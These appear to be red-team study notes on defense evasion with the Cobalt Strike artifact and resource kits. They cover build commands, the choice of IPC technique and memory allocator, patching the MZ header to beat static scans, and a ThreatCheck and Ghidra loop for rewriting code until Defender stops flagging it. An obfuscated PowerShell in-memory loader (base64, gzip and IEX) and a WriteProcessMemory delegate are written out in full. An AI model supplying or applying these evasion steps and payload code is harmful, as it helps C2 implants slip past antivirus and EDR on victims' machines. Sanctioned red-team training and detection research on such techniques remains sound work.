# Defense Evasion  


## Build new artifacts    

```
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

### Parameter Reference

```
./build.sh <technique> <allocator> <magic_mz_x86> <magic_mz_x64> <rdll_x86> <rdll_x64> <stack_spoof> <output_dir>
```

| # | Parameter | Value in Example | Purpose |
|---|-----------|-----------------|---------|
| 1 | `technique` | `mailslot` | IPC method used to pass shellcode into the artifact. Options: `mailslot`, `pipe`, `readfile` |
| 2 | `allocator` | `VirtualAlloc` | Memory allocation method for shellcode. Options: `VirtualAlloc`, `MapViewOfFile`, `HeapAlloc` |
| 3 | `magic_mz_x86` | `351363` | Replaces the `MZ` (4D5A) DOS header magic bytes in x86 artifact — defeats static sig detection. Patched back at runtime |
| 4 | `magic_mz_x64` | `0` | Same as above for x64. `0` = use default (no substitution) |
| 5 | `rdll_x86` | `false` | Use Reflective DLL staging for x86 payload |
| 6 | `rdll_x64` | `false` | Use Reflective DLL staging for x64 payload |
| 7 | `stack_spoof` | `none` | Call stack spoofing. Options: `none` or a spoofing technique name |
| 8 | `output_dir` | `/mnt/c/Tools/cobaltstrike/custom-artifacts` | Where compiled artifacts land — load this dir in CS via `Script Manager` / `artifact.cna` |

### Technique Options

| Technique | How it works | OPSEC |
|-----------|-------------|-------|
| `mailslot` | Shellcode passed via Windows mailslot IPC | Less commonly signatured |
| `pipe` | Named pipe IPC | Common — more detection rules |
| `readfile` | Reads shellcode from a temp file | OPSEC-CAUTION — writes to disk |

### Allocator Options

| Allocator | OPSEC note |
|-----------|-----------|
| `VirtualAlloc` | Most common — heavily monitored by EDR hooks |
| `MapViewOfFile` | File-backed mapping — less detected but still monitored |
| `HeapAlloc` | Heap-based — can evade RWX page detection |

### magic_mz Explained

Every Windows PE file starts with bytes `4D 5A` (hex) — ASCII **MZ** — at offset 0x00:

```
Offset 0x00:  4D 5A 90 00 03 00 ...
              ^^ ^^
              M  Z   ← Defender looks for this at byte 0
```

Defender and AV use this as a static signature — anything starting with `MZ` gets flagged as a PE and scrutinised. The `magic_mz` parameter replaces those bytes before the artifact is written to disk/memory:

```
351363 decimal = 0x055C03 hex → first two bytes: 03 5C

On disk: 03 5C ...  ← looks like garbage, not a PE → passes static scan
```

At runtime the artifact's own stub patches them back before execution:

```
03 5C ...  →  4D 5A ...  (MZ restored → valid PE loaded and executed)
```

| Stage | Bytes at offset 0 | What Defender sees |
|-------|-------------------|-------------------|
| On disk / initial scan | `03 5C` (custom value) | Not a PE — passes static scan |
| At runtime (self-patched) | `4D 5A` (MZ restored) | Executable running in memory |

`magic_mz_x64 = 0` means no substitution for x64 — real MZ header left intact. Use a non-zero value for both archs when Defender is active.

---

**tip:** `mailslot` + `HeapAlloc` + custom `magic_mz` values is the quietest combination. Avoid `readfile` (disk write) and `VirtualAlloc` with RWX pages (EDR hook bait).

After build, load the aggressor script:

```
Cobalt Strike → Script Manager → Load → <output_dir>/artifact.cna
```

## ThreatCheck  

```dos
ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe" 
```  

>Identified bits that is detected by Defender and a HEX offset provided.

## Ghidra  

```
ghidraRun.bat
```  

### Ghidra Steps:  

1. New Project  

<img src="/images/ghidra01.png" width=600>  

2. Import File  

<img src="/images/ghidra02.png" width=400>  

3. Double Click to open imported file

<img src="/images/ghidra03.png" width=400>  

4. Analyze the file, yes all. Use offset provided by ***ThreatCheck*** and copy to Navigation Menu - Go to ...  

```
file(0x9CF)
```  

<img src="/images/ghidra04.png" width=600>  

5. See the reversed code decompiled on right window that is detected by Defender Antivirus.  

<img src="/images/ghidra05.png" width=800>  

6. Back to output from ***ThreatCheck***, copy last row of HEX bytes. In Ghidra open `Search Menu - Memory`. Then paste HEX bytes and click found memory location to take us to detected bit.  

<img src="/images/ghidra06.png" width=700> 

7. The function in this case for loop is confirmed to be location detected by antivirus. Using this identified function we go into our source code.

<img src="/images/ghidra07.png" width=600> 

8. Open Visual Code. In menu Edit - Find in Files, type string to search for above identified function.  

<img src="/images/ghidra08.png" width=600> 

9. Replace the identified function loop or piece of code with alternative approach to bypass defender detection. Example a backwards while loop.  

>Now repeat above by start with building new set of artifacts templates, and running ***ThreatCheck*** again.    
>Repeat until ***ThreatCheck*** shows no threat found.  

## Script Artifacts Kit  

>Building a new set of resources, without changing anything  

```
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```  

>Scanning template with ThreatCheck's AMSI engine  

```ps1
.\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```

>Based on ThreatCheck output, simple String concatenation attempt in source code change.  

```ps1
('Syst'+'em.dll')
```  

>ThreatCheck next detection, shows marshal.copy method flagged and replace with native write process memory API.  

```ps1
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```  

>ThreatCheck misses different parts of code evaluation, use ***obfuscation***  
>[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)  

>Set the script block to be that of `compress.ps1` content.  

```
Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
```  

>token obfuscations result output:  

```
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```  

>Overwrite the content in `compress.ps1`, save the changes, then host and test a new payload.  

## Beacon Memory  


